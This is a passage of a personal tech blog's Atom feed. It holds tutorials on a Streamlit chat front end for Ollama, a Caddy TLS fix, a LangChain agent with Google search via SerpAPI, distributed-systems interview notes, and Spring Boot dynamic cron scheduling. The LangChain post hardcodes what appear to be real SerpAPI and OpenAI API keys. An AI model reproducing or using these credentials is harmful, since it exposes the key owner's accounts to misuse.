class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer</span><br><span class="line"><span class="keyword">from</span> ctransformers <span class="keyword">import</span> AutoModelForCausalLM</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> TextStreamer</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">logging.basicConfig(</span><br><span class="line">    level=logging.INFO,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>,</span><br><span class="line">    handlers=[</span><br><span class="line">        logging.StreamHandler(),  <span class="comment"># 输出到控制台</span></span><br><span class="line">        logging.FileHandler(<span class="string">&#x27;qwen-chat-gguf.log&#x27;</span>)  <span class="comment"># 输出到文件</span></span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> streamlit <span class="keyword">as</span> st</span><br><span class="line">st.set_page_config(</span><br><span class="line">    page_title=<span class="string">&quot;MY AI&quot;</span>,</span><br><span class="line">    page_icon=<span class="string">&quot;🤖&quot;</span>  </span><br><span class="line">)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">AI对话模块，支持流式输出 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QwenChat</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.api_base = <span class="string">&quot;http://localhost:11434&quot;</span>  <span class="comment"># Ollama默认地址</span></span><br><span class="line">        self.model = <span class="string">&quot;mymodel&quot;</span>  <span class="comment"># 使用的模型名称</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stream_chat</span>(<span class="params">self, prompt,history=<span class="literal">None</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构建API请求</span></span><br><span class="line">        url = <span class="string">f&quot;<span class="subst">&#123;self.api_base&#125;</span>/api/generate&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;model&quot;</span>: self.model,</span><br><span class="line">            <span class="string">&quot;prompt&quot;</span>: prompt,</span><br><span class="line">            <span class="string">&quot;stream&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;system&quot;</span>: <span class="string">&quot;你是AI助手&quot;</span>,</span><br><span class="line">            <span class="string">&quot;messages&quot;</span>: history</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送流式请求</span></span><br><span class="line">            response = requests.post(url, headers=headers, json=data, stream=<span class="literal">True</span>)</span><br><span class="line">            response.raise_for_status()</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">                        </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.error(<span class="string">f&quot;调用Ollama API时发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span> e</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="meta">@st.cache_resource</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_qwen_chat_instance</span>():</span></span><br><span class="line">    <span class="keyword">return</span> QwenChat()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">        torch.cuda.empty_cache()</span><br><span class="line">     <span class="comment"># 创建 QwenChat 实例</span></span><br><span class="line">    <span class="comment"># 使用共享的 QwenChat 实例</span></span><br><span class="line">    qwen_chat = get_qwen_chat_instance()</span><br><span class="line">    </span><br><span class="line">    st.title(<span class="string">&quot;AI助手&quot;</span>)</span><br><span class="line">    st.write(<span class="string">&quot;请问有什么可以帮您的？&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化对话历史</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;messages&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> st.session_state:</span><br><span class="line">        st.session_state.messages = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 显示历史对话</span></span><br><span class="line">    <span class="keyword">for</span> message <span class="keyword">in</span> st.session_state.messages:</span><br><span class="line">        <span class="keyword">with</span> st.chat_message(message[<span class="string">&quot;role&quot;</span>]):</span><br><span class="line">            st.markdown(message[<span class="string">&quot;content&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 用户输入</span></span><br><span class="line">    <span class="keyword">if</span> prompt := st.chat_input(<span class="string">&quot;请输入您的问题&quot;</span>):</span><br><span class="line">        <span class="comment"># 显示用户问题</span></span><br><span class="line">        <span class="keyword">with</span> st.chat_message(<span class="string">&quot;user&quot;</span>):</span><br><span class="line">            st.markdown(prompt)</span><br><span class="line">        st.session_state.messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: prompt&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 显示AI回答</span></span><br><span class="line">        <span class="keyword">with</span> st.chat_message(<span class="string">&quot;assistant&quot;</span>):</span><br><span class="line">            message_placeholder = st.empty()</span><br><span class="line">            full_response = <span class="string">&quot;&quot;</span></span><br><span class="line">            </span><br><span class="line">            full_text = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="comment"># 获取历史消息（不包括最新的用户消息）</span></span><br><span class="line">            history = st.session_state.messages[:<span class="number">-1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(st.session_state.messages) &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">            response = qwen_chat.stream_chat(prompt, history)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> response.iter_lines():</span><br><span class="line">                <span class="keyword">if</span> line:</span><br><span class="line">                    <span class="comment"># 解析JSON响应</span></span><br><span class="line">                    chunk = json.loads(line)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;response&quot;</span> <span class="keyword">in</span> chunk:</span><br><span class="line">                        text_chunk = chunk[<span class="string">&quot;response&quot;</span>]</span><br><span class="line">                        <span class="comment"># print(text_chunk)</span></span><br><span class="line">                        full_text += text_chunk</span><br><span class="line">                        <span class="comment"># 更新ui</span></span><br><span class="line">                        message_placeholder.markdown(full_text + <span class="string">&quot;▌&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 如果生成结束,退出循环    </span></span><br><span class="line">                    <span class="keyword">if</span> chunk.get(<span class="string">&quot;done&quot;</span>, <span class="literal">False</span>):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 更新最终响应</span></span><br><span class="line">            message_placeholder.markdown(full_text)</span><br><span class="line">            </span><br><span class="line">            st.session_state.messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: full_text&#125;)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><p>最终运行启动命令： <code>streamlit run main.py</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;说明&quot;&gt;说明&lt;/span&gt;&lt;/h1&gt;&lt;p&gt; 使用ollama可以很方便的运行本地大模型(包括官方模型和gguf量化模型)，使用streamlit快速构建对话界面。&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;安装ollama&quot;&gt;安装ollama&lt;/span&gt;&lt;</summary>
      
    
    
    
    <category term="AI" scheme="https://reiner.host/categories/AI/"/>
    
    
    <category term="AI" scheme="https://reiner.host/tags/AI/"/>
    
    <category term="ollama" scheme="https://reiner.host/tags/ollama/"/>
    
    <category term="python" scheme="https://reiner.host/tags/python/"/>
    
    <category term="streamlit" scheme="https://reiner.host/tags/streamlit/"/>
    
  </entry>
  
  <entry>
    <title>记caddy2报:no cipher suite supported by both client and server</title>
    <link href="https://reiner.host/posts/850289f1.html"/>
    <id>https://reiner.host/posts/850289f1.html</id>
    <published>2024-07-22T05:50:54.000Z</published>
    <updated>2024-12-17T12:59:22.019Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="描述">描述</span></h1><p>配置好域名转发后发现依旧无法访问，使用<code>service caddy status</code> 发现报错： <code>no cipher suite supported by both client and server</code></p><h1><span id="解决">解决</span></h1><p>改成如下配置:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">site.com &#123;</span><br><span class="line">        reverse_proxy localhost:8080</span><br><span class="line">        tls &#123;</span><br><span class="line">                protocols tls1.2 tls1.2</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>增加 tls协议配置即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;描述&quot;&gt;描述&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;配置好域名转发后发现依旧无法访问，使用&lt;code&gt;service caddy status&lt;/code&gt; 发现报错： &lt;code&gt;no cipher suite supported by both client</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Enable AI to have internet access - Google search integrated langchain</title>
    <link href="https://reiner.host/posts/12306.html"/>
    <id>https://reiner.host/posts/12306.html</id>
    <published>2024-04-20T04:19:29.000Z</published>
    <updated>2024-12-17T12:51:11.835Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="basic-dependency">Basic dependency</span></h1><ul><li>python 3.1.12 + </li><li>langchain 0.1.12 + </li><li>SERPAPI_API_KEY</li><li>OPEN_AI_API_KEY</li></ul><p>SERPAPI_API_KEY get from <a href="https://serpapi.com/">https://serpapi.com/</a></p><p>Install the following dependencies:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install langchain</span><br><span class="line">pip install pymupdf</span><br><span class="line">pip install openai</span><br><span class="line">pip install --upgrade --quiet  langchain langchain-community langchainhub langchain-openai chromadb bs4</span><br><span class="line">pip install --upgrade langchain-openai tiktoken chromadb langchain</span><br><span class="line">pip install fake_useragent</span><br></pre></td></tr></table></figure><h1><span id="get-start">Get start</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set the api key</span></span><br><span class="line">os.environ[<span class="string">&quot;SERPAPI_API_KEY&quot;</span>] = <span class="string">&#x27;003dc0d2d9e0dc818aa2b497342346dfgdf799af1849c5d1249d34dd7&#x27;</span></span><br><span class="line">openai.api_key=<span class="string">&quot;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&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> langchain_openai <span class="keyword">import</span> ChatOpenAI</span><br><span class="line"><span class="keyword">from</span> langchain_core.prompts <span class="keyword">import</span> ChatPromptTemplate, MessagesPlaceholder</span><br><span class="line"><span class="keyword">from</span> langchain.memory <span class="keyword">import</span> ChatMessageHistory</span><br><span class="line"><span class="keyword">from</span> langchain_text_splitters <span class="keyword">import</span> RecursiveCharacterTextSplitter</span><br><span class="line"><span class="keyword">from</span> langchain_community.vectorstores <span class="keyword">import</span> Chroma</span><br><span class="line"><span class="keyword">from</span> langchain_openai <span class="keyword">import</span> OpenAIEmbeddings</span><br><span class="line"></span><br><span class="line"><span class="comment"># build tool agent</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> langchain_community.utilities <span class="keyword">import</span> SerpAPIWrapper</span><br><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> create_openai_tools_agent</span><br><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> AgentExecutor,Tool</span><br><span class="line"><span class="keyword">from</span> langchain.memory <span class="keyword">import</span> ConversationBufferWindowMemory</span><br><span class="line"></span><br><span class="line">chat = ChatOpenAI(model=<span class="string">&quot;gpt-3.5-turbo-1106&quot;</span>,streaming=<span class="literal">True</span>,max_tokens=<span class="number">4090</span>,max_retries=<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 加载 serpapi 工具</span></span><br><span class="line">search = SerpAPIWrapper()</span><br><span class="line"></span><br><span class="line">tools = [Tool(</span><br><span class="line">    name=<span class="string">&quot;google_search&quot;</span>,</span><br><span class="line">    description=<span class="string">&quot;Search Google for recent results.&quot;</span>,</span><br><span class="line">    func=search.run,</span><br><span class="line">    max_results=<span class="number">1</span>,</span><br><span class="line">    max_iterations=<span class="number">2</span>,</span><br><span class="line">    max_retries=<span class="number">2</span>,</span><br><span class="line">    max_consecutive_errors=<span class="number">2</span>,</span><br><span class="line">    max_tokens=<span class="number">2000</span>, <span class="comment">#must</span></span><br><span class="line">    return_direct=<span class="literal">False</span></span><br><span class="line">)]</span><br><span class="line"></span><br><span class="line">prompt = ChatPromptTemplate.from_messages(</span><br><span class="line">    [</span><br><span class="line">        (</span><br><span class="line">            <span class="string">&quot;system&quot;</span>,</span><br><span class="line">            <span class="string">&quot;You are a helpful assistant. You may not need to use tools for every query - the user may just want to chat!&quot;</span>,</span><br><span class="line">        ),</span><br><span class="line">         (<span class="string">&quot;user&quot;</span>, <span class="string">&quot;&#123;input&#125;&quot;</span>),</span><br><span class="line">         MessagesPlaceholder(variable_name=<span class="string">&quot;agent_scratchpad&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">memory = ConversationBufferWindowMemory(k=<span class="number">2</span>, return_messages=<span class="literal">True</span>)</span><br><span class="line">agent = create_openai_tools_agent(tools = tools,llm = chat,prompt=prompt)</span><br><span class="line">agent_executor = AgentExecutor(agent=agent, tools=tools, verbose=<span class="literal">True</span>,max_iterations=<span class="number">2</span>,memory=memory)</span><br><span class="line">response = agent_executor.invoke(&#123;<span class="string">&quot;input&quot;</span>: <span class="string">&#x27;Who is the current President of the United States?&#x27;</span>&#125;)</span><br><span class="line">print(response)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Now AI can first use Google search and then answer your questions.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;basic-dependency&quot;&gt;Basic dependency&lt;/span&gt;&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;python 3.1.12 + &lt;/li&gt;
&lt;li&gt;langchain 0.1.12 + &lt;/li&gt;
&lt;li&gt;SERPAPI_API_KEY&lt;</summary>
      
    
    
    
    <category term="AI" scheme="https://reiner.host/categories/AI/"/>
    
    
    <category term="AI" scheme="https://reiner.host/tags/AI/"/>
    
    <category term="ChatGPT" scheme="https://reiner.host/tags/ChatGPT/"/>
    
    <category term="对话机器人" scheme="https://reiner.host/tags/%E5%AF%B9%E8%AF%9D%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
  </entry>
  
  <entry>
    <title>分布式常见面试笔记</title>
    <link href="https://reiner.host/posts/4320.html"/>
    <id>https://reiner.host/posts/4320.html</id>
    <published>2024-03-12T04:17:44.991Z</published>
    <updated>2024-07-22T05:57:55.599Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="java分布式服务常见面试题">JAVA分布式服务常见面试题</span></h1><h1><span id="分布式事务">分布式事务</span></h1><h3><span id="seata">Seata</span></h3><p>seata是阿里开源的分布式事务调度框架，支持TCC、AT、SAGA、XA四种模式</p><ul><li><p>AT<br>SEATA默认是AT模式，通过@GlobalTrancation 动态代理生成全局事务ID，并通过RM来管理全局事务，如中间出错需要回滚事务时则通过数据库中的undo-log回写，undolog记录了数据提交前的状态</p></li><li><p>XA<br>二阶段提交，需要数据库本身支持XA协议</p></li><li><p>TCC<br>即 尝试(Try)-确认(Confirm)-取消(Cancel)，每个事务都分成这三个阶段，在提交事务前向另一个系统发送确认消息，两边系统都确认OK了才执行提交操作，有一方出现异常则执行Cancel（补偿方法），缺点在于三个方法都需要自已手动完成</p></li><li><p>SAGA<br>与TCC类似，不同点在于一阶段直接提交事务，失败则执行补偿操作，无锁，因此性能相对较好，但同时由于没有事务隔离性会带来赃写</p></li></ul><span id="more"></span><h1><span id="分布式锁">分布式锁</span></h1><h3><span id="基于数据库的cas乐观锁">基于数据库的CAS乐观锁</span></h3><p>  更新数据的时候带上指定版本号，如果被其他线程提前更新的版本号，则此次更新失败，缺点对数据库表侵入较大，每个表需要增加version字段，高并发下存在很多更新失败。</p><h3><span id="通过redis实现">通过redis实现</span></h3><p>  使用命令 <code>SET key value NX PX milliseconds</code> </p><p>缺点:</p><ul><li>获取锁是非阻塞</li><li>非公平锁，不支持需要公平锁的场景</li><li>redis主从存在延迟，在master宕机发生主从切换时，可能会导致锁失效</li></ul><p>改进：<br>  基于Redlock算法实现分布式锁。 redisson对Redlock算法进行了封装。<br>  <strong>简单来说就是同时向多个节点发送锁定命令，当获取锁时由于是多个节点会有时间差问题。</strong></p><p>  **客户端计算获取锁所花的时间，只有当客户端在大多数master节点上成功获取了锁，而且总共消耗的时间不超过锁释放时间，这个锁就认为是获取成功了 **</p><h3><span id="基于zookeeper实现分布式锁">基于zookeeper实现分布式锁</span></h3>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;JAVA分布式服务常见面试题&quot;&gt;&lt;a href=&quot;#JAVA分布式服务常见面试题&quot; class=&quot;headerlink&quot; title=&quot;JAVA分布式服务常见面试题&quot;&gt;&lt;/a&gt;JAVA分布式服务常见面试题&lt;/h1&gt;&lt;h1 id=&quot;分布式事务&quot;&gt;&lt;a href=&quot;#分布式事务&quot; class=&quot;headerlink&quot; title=&quot;分布式事务&quot;&gt;&lt;/a&gt;分布式事务&lt;/h1&gt;&lt;h3 id=&quot;Seata&quot;&gt;&lt;a href=&quot;#Seata&quot; class=&quot;headerlink&quot; title=&quot;Seata&quot;&gt;&lt;/a&gt;Seata&lt;/h3&gt;&lt;p&gt;seata是阿里开源的分布式事务调度框架，支持TCC、AT、SAGA、XA四种模式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;AT&lt;br&gt;SEATA默认是AT模式，通过@GlobalTrancation 动态代理生成全局事务ID，并通过RM来管理全局事务，如中间出错需要回滚事务时则通过数据库中的undo-log回写，undolog记录了数据提交前的状态&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;XA&lt;br&gt;二阶段提交，需要数据库本身支持XA协议&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;TCC&lt;br&gt;即 尝试(Try)-确认(Confirm)-取消(Cancel)，每个事务都分成这三个阶段，在提交事务前向另一个系统发送确认消息，两边系统都确认OK了才执行提交操作，有一方出现异常则执行Cancel（补偿方法），缺点在于三个方法都需要自已手动完成&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SAGA&lt;br&gt;与TCC类似，不同点在于一阶段直接提交事务，失败则执行补偿操作，无锁，因此性能相对较好，但同时由于没有事务隔离性会带来赃写&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>SpringBoot定时任务Scheduled动态修改Cron执行时间</title>
    <link href="https://reiner.host/posts/1230.html"/>
    <id>https://reiner.host/posts/1230.html</id>
    <published>2024-03-12T04:16:59.833Z</published>
    <updated>2024-07-22T05:57:35.742Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="场景">场景</span></h1><p>  当某些简单的定时任务需要通过后台修改执行时间时，通过spring boot自带的定时任务来实现是个不错的选择。</p><h1><span id="代码实现">代码实现</span></h1><h3><span id="创建定时任务类">创建定时任务类</span></h3><p> 需要实现<code>SchedulingConfigurer</code>接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Scheduled</span> <span class="keyword">implements</span> <span class="title">SchedulingConfigurer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String cron;</span><br><span class="line">    TaskScheduler taskScheduler;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">CronMapper cronMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TaskScheduler <span class="title">taskScheduler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ThreadPoolTaskScheduler scheduler = <span class="keyword">new</span> ThreadPoolTaskScheduler();</span><br><span class="line">        scheduler.setPoolSize(<span class="number">30</span>);</span><br><span class="line">        scheduler.setThreadNamePrefix(<span class="string">&quot;TaskScheduler-&quot;</span>);</span><br><span class="line">        scheduler.initialize();</span><br><span class="line">        <span class="keyword">return</span> scheduler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configureTasks</span><span class="params">(ScheduledTaskRegistrar taskRegistrar)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.taskRegistrar=taskRegistrar;</span><br><span class="line"><span class="keyword">this</span>.taskScheduler=taskScheduler();</span><br><span class="line">scheduleTask();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">scheduleTask</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> taskScheduler.schedule(<span class="keyword">this</span>.task, triggerContext -&gt; &#123;</span><br><span class="line">             <span class="comment">//从数据库获取执行周期</span></span><br><span class="line">             <span class="keyword">if</span>(!StringUtils.hasText(<span class="keyword">this</span>.cron)) &#123;</span><br><span class="line">             Cron c = cronMapper.selectById(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">             <span class="comment">//如果为空设置默认</span></span><br><span class="line">             <span class="keyword">if</span>(c==<span class="keyword">null</span>) &#123;</span><br><span class="line">             c=<span class="keyword">new</span> Cron();</span><br><span class="line">                 c.setCronId(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">                 c.setCron(<span class="string">&quot;0 0 0/6 * * ? &quot;</span>);</span><br><span class="line">                 cronMapper.insert(c);</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">this</span>.cron = c.getCron();</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="comment">//返回执行周期</span></span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">new</span> CronTrigger(<span class="keyword">this</span>.cron).nextExecutionTime(triggerContext);</span><br><span class="line">         &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCron</span><span class="params">(String cron)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.cron = cron;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="通过接口触发修改执行时间">通过接口触发修改执行时间</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@PostMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">updateCron</span><span class="params">(String cron)</span></span>&#123;</span><br><span class="line"> <span class="comment">//此处省略修改数据库中的cron 值 </span></span><br><span class="line">     ...</span><br><span class="line"></span><br><span class="line">     <span class="comment">//修改为新的执行时间</span></span><br><span class="line">     scheduled.setCron(cron);</span><br><span class="line">     scheduled.scheduleTask();</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;修改成功&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;场景&quot;&gt;场景&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;  当某些简单的定时任务需要通过后台修改执行时间时，通过spring boot自带的定时任务来实现是个不错的选择。&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;代码实现&quot;&gt;代码实现&lt;/span&gt;&lt;/h1&gt;&lt;h3&gt;&lt;sp</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>使用Caddy作为HTTP服务器并配置反向代理到本地端口</title>
    <link href="https://reiner.host/posts/100d4ce.html"/>
    <id>https://reiner.host/posts/100d4ce.html</id>
    <published>2023-07-02T13:59:01.000Z</published>
    <updated>2023-08-26T04:09:00.815Z</updated>
    
